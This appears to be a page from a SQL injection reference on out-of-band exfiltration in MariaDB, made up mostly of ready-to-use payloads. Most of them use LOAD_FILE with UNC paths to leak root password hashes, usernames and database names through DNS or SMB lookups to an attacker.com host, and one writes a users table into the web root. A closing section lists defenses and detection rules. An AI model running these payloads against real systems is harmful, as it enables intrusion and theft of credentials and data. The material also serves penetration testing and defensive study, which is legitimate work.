---
title: Out of Band Channeling
description: Techniques for exfiltrating data through out-of-band channels in MariaDB
category: Advanced Techniques
order: 17
tags: ["OOB", "exfiltration", "DNS", "HTTP"]
lastUpdated: 2025-12-18
---

## Out of Band Channeling

Out-of-band (OOB) channeling refers to techniques that exfiltrate data through channels other than the application's normal response. This approach is extremely valuable in blind SQL injection scenarios where no data is returned in the application's response.

### When to Use OOB Techniques

- Blind SQL injection scenarios where no output is visible
- Cases where application responses are filtered or truncated
- When the regular injection process is too slow or limited
- When firewall rules block traditional SQL injection but allow outbound connections

### Prerequisites

Before attempting OOB techniques, verify capabilities:

```sql
-- Check FILE privilege
SELECT COUNT(*) FROM information_schema.user_privileges
WHERE REPLACE(SUBSTRING_INDEX(GRANTEE, '@', 1), "'", '') = SUBSTRING_INDEX(USER(), '@', 1)
AND PRIVILEGE_TYPE = 'FILE'

-- Check secure_file_priv setting
SELECT @@secure_file_priv AS priv

-- Check local_infile setting
SELECT @@local_infile AS enabled

-- Verify LOAD_FILE function works (returns NULL if no FILE privilege)
SELECT LOAD_FILE('/etc/passwd') AS test
```

### MariaDB OOB Methods

MariaDB offers several mechanisms for out-of-band data exfiltration:

#### 1. DNS Exfiltration

DNS exfiltration works by forcing MariaDB to perform DNS lookups for domain names containing the extracted data:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user WHERE user='root' LIMIT 1), '.attacker.com\\share\\file'));
```

This causes MariaDB to resolve a subdomain like `5f4dcc3b5aa765d61d8327deb882cf99.attacker.com`, sending the password hash as part of the DNS request.

> **Platform Dependency:** UNC paths (e.g., `\\attacker.com\share`) leverage Windows SMB/NetBIOS behavior and are **primarily effective on Windows systems**. On Linux/Unix, this technique typically does not work unless Samba/SMB client libraries are installed and properly configured (which is uncommon for database servers). Default Linux MariaDB deployments will simply return NULL for UNC path LOAD_FILE calls without triggering DNS lookups.

##### DNS Path Construction Examples

```sql
-- Exfiltrate database name
SELECT CONCAT('\\\\', DATABASE(), '.db.attacker.com\\share') AS dns_path

-- Exfiltrate version (replace dots with hyphens for valid DNS)
SELECT CONCAT('\\\\', REPLACE(VERSION(), '.', '-'), '.version.attacker.com\\share') AS dns_path

-- Exfiltrate current user
SELECT CONCAT('\\\\', SUBSTRING_INDEX(USER(), '@', 1), '.user.attacker.com\\share') AS dns_path
```

#### 2. SMB Shares Exfiltration

Using UNC paths to connect to SMB shares (Windows environments):

```sql
-- Basic SMB exfiltration
SELECT LOAD_FILE('\\\\attacker.com\\share\\file')

-- With data in path
SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', DATABASE(), '\\file'))
```

#### 3. Note on HTTP Exfiltration

`LOAD_FILE()` **cannot** fetch HTTP URLs - it only reads local filesystem paths (and UNC paths on Windows for SMB/DNS exfiltration). This is a common misconception.

For HTTP-based out-of-band exfiltration, other mechanisms are required:

- External UDFs (User Defined Functions) with network capabilities
- Server-side command execution via `sys_exec()` (if installed)
- DNS exfiltration (covered above) - the most reliable OOB method for MariaDB
- Writing data to web-accessible directories (covered below)

The URL construction examples below are useful for building URLs that could be fetched by external tools or written to files for retrieval, but MariaDB itself cannot make HTTP requests via `LOAD_FILE()`.

```sql
-- Construct a URL for external use (not for LOAD_FILE)
SELECT CONCAT('http://attacker.com/exfil?data=', HEX(USER())) AS http_url

-- This URL could be written to a file and retrieved later
SELECT CONCAT(
  'http://attacker.com/exfil',
  '?db=', DATABASE(),
  '&user=', SUBSTRING_INDEX(USER(), '@', 1)
) INTO OUTFILE '/var/www/html/exfil_url.txt';
```

#### 4. File-based Exfiltration

If you have the FILE privilege:

```sql
-- Write data to a file
SELECT * FROM users INTO OUTFILE '/var/www/html/exported_data.txt';
-- Then retrieve it via HTTP or another method
```

### Practical Examples

#### Basic DNS Exfiltration

```sql
-- Exfiltrate MariaDB version via DNS
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.version.attacker.com\\share\\file'));
```

#### Data Extraction via DNS

```sql
-- Extract usernames character by character
-- Extract first character of first username
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1), '.char1.attacker.com\\share\\file'));
```

### Required Setup

To capture this data, you need:

1. A domain you control
2. A DNS server configured to log all requests (or a service like Burp Collaborator)
3. Proper network connectivity (the MariaDB server must be able to resolve external domains)

### Ethical and Legal Considerations

Out-of-band exfiltration techniques can extract sensitive data without visible application responses. Use these techniques responsibly:

- Only perform OOB attacks on systems with explicit written authorization
- Ensure your data capture infrastructure is properly secured
- Document all testing activities and findings
- Never exfiltrate actual sensitive data from production during assessments
- Consider legal implications in your jurisdiction - data exfiltration may have specific legal consequences
- Report findings through proper responsible disclosure channels

### Advanced Techniques

#### Encoding Data for DNS Transport

For complex data, consider encoding to avoid invalid DNS characters:

```sql
-- Hex encoding
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(password) FROM mysql.user WHERE user='root' LIMIT 1), '.hex.attacker.com\\share\\file'));

-- Lowercase hex for DNS compatibility (DNS is case-insensitive)
SELECT CONCAT('\\\\', LOWER(HEX(SUBSTRING_INDEX(USER(), '@', 1))), '.hex.user.attacker.com\\share\\file') AS payload

-- Replace invalid DNS characters
SELECT REPLACE(REPLACE(REPLACE('data with spaces.and" dots', ' ', '-'), '.', '-'), '"', '') AS dns_safe
```

#### Character-by-Character Extraction

Extract data one character at a time using ASCII values:

```sql
-- Extract ASCII value of first character
SELECT ASCII(SUBSTRING('admin', 1, 1)) AS char_ascii
-- Returns: 97 ('a')

-- Construct DNS path with ASCII value
SELECT CONCAT('\\\\', ASCII(SUBSTRING(USER(), 1, 1)), '.ascii.attacker.com\\share') AS ascii_path

-- Extract multiple ASCII values
SELECT CONCAT_WS('-',
  ASCII(SUBSTRING('test', 1, 1)),
  ASCII(SUBSTRING('test', 2, 1)),
  ASCII(SUBSTRING('test', 3, 1)),
  ASCII(SUBSTRING('test', 4, 1))
) AS ascii_values
-- Returns: 116-101-115-116 (t-e-s-t)
```

#### Chunking Large Data

DNS labels have a maximum length of 63 characters, so chunk longer strings:

```sql
-- First 10 characters
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT SUBSTRING(table_schema,1,10) FROM information_schema.tables LIMIT 1), '.chunk1.attacker.com\\share\\file'));

-- Next 10 characters
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT SUBSTRING(table_schema,11,10) FROM information_schema.tables LIMIT 1), '.chunk2.attacker.com\\share\\file'));

-- Calculate number of chunks needed
SELECT CEILING(LENGTH('a_very_long_string_that_needs_chunking') / 10) AS num_chunks
-- Returns: 4

-- Truncate to DNS label limit (63 chars)
SELECT LEFT(REPEAT('a', 100), 63) AS truncated
```

#### DNS Label Validation

DNS labels must follow specific rules:

```sql
-- Check if string fits in DNS label (max 63 chars)
SELECT IF(LENGTH('short') <= 63, 'valid', 'invalid') AS is_valid

-- Validate alphanumeric and hyphen only
SELECT 'test-data-123' REGEXP '^[a-zA-Z0-9-]+$' AS is_valid
-- Returns: 1 (true)

-- Check string with invalid characters
SELECT 'data with spaces' REGEXP '^[a-zA-Z0-9-]+$' AS is_valid
-- Returns: 0 (false)
```

#### Data Extraction Subqueries

Techniques for extracting data via subqueries:

```sql
-- Extract single value
SELECT (SELECT username FROM users LIMIT 1) AS extracted

-- Extract with LIMIT and OFFSET for iteration
SELECT (SELECT username FROM users LIMIT 1 OFFSET 0) AS user1,
       (SELECT username FROM users LIMIT 1 OFFSET 1) AS user2

-- Extract from information_schema
SELECT (SELECT table_name FROM information_schema.tables
        WHERE table_schema = DATABASE() LIMIT 1) AS tbl

-- GROUP_CONCAT for multiple values in one request
SELECT (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) AS all_users
```

#### Complete OOB Payload Examples

Full payload construction for real-world use:

```sql
-- Full DNS exfil with version
SELECT CONCAT(
  '\\\\',
  REPLACE(REPLACE(VERSION(), '.', '-'), ' ', '-'),
  '.version.attacker.com\\share\\file'
) AS payload

-- Full DNS exfil with hex-encoded user
SELECT CONCAT(
  '\\\\',
  LOWER(HEX(SUBSTRING_INDEX(USER(), '@', 1))),
  '.hex.user.attacker.com\\share\\file'
) AS payload

-- Full DNS exfil with chunked data
SELECT
  CONCAT('\\\\', SUBSTRING(DATABASE(), 1, 10), '.c1.attacker.com\\s') AS chunk1,
  CONCAT('\\\\', SUBSTRING(DATABASE(), 11, 10), '.c2.attacker.com\\s') AS chunk2
```

### Limitations

1. DNS queries are generally limited to 253 characters
2. Some environments block outbound DNS or HTTP requests
3. FILE privilege or similar permissions may be required
4. Network latency and DNS caching can slow down extraction
5. Extracted data must be valid in DNS names (alphanumeric, hyphens)

### Mitigation

#### Primary Defenses (Prevent SQL Injection)

1. **Use prepared statements and parameterized queries** - The most effective defense against SQL injection, though they don't stop exfiltration if an injection already exists
2. **Strict input validation** - Validate and sanitize all user inputs at application boundaries
3. **Least-privilege database accounts** - Applications should connect with minimal required permissions

#### OOB-Specific Controls

**Database-Level:**

- **Disable FILE privilege** - Revoke FILE from application database users to prevent LOAD_FILE and INTO OUTFILE
- **Set `secure_file_priv`** - Restrict file operations to specific directories or disable entirely (`secure_file_priv = NULL`)
- **Set `skip-networking`** - For local-only MariaDB instances that don't need network access
- **Disable LOAD DATA LOCAL** - Set `local_infile = 0` to prevent local file reading

**Network-Level:**

- **DNS filtering and monitoring** - Block or log unusual DNS queries from database servers; use internal DNS resolvers
- **Egress filtering** - Allowlist only required outbound connections from database servers (typically none)
- **Block recursive DNS** - Force database servers to use controlled internal DNS resolvers
- **SMB/NetBIOS blocking** - Block outbound ports 137-139, 445 from database servers

**Detection and Monitoring:**

- **Database Activity Monitoring (DAM)** - Deploy rules to detect OOB query patterns (LOAD_FILE with UNC paths, unusual CONCAT with DNS-like strings)
- **DNS query logging** - Centralized DNS analytics to detect data exfiltration patterns
- **Outbound connection alerting** - Alert on any outbound connections from database servers
- **Rate limiting** - Detect and alert on unusual query patterns or high-frequency requests
